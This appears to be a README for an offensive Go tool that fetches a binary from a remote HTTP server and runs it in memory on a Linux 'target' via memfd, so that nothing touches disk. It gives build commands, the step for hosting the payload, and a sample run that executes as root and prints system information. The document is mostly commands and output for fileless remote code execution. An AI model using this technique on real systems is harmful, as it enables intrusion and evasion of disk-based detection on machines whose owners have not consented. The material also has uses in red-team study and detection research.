# Remote memfd Exec

Execute a remote binary directly in memory on Linux without writing to disk

## Build the payload and executor

```
env GOOS=linux GOARCH=amd64 go build payload.go
env GOOS=linux GOARCH=amd64 go build remote_memfd_exec.go
```

# Host the payload on a server

```
 python3 -m http.server
```


# Execute the remote payload in memory on the target

```
./remote_exec_memfd http://server:8000/payload                                                                  Fetching binary from: http://server:8000/payload
Downloaded 2506798 bytes
Executing payload in memory...

[+] Executing remote payload in memory using memfd_exec
========= System Information ========
Time: Wed, 26 Jun 2024 12:34:56 UTC
Hostname: target
Username: root
OS: linux
Architecture: amd64
========================================== 
```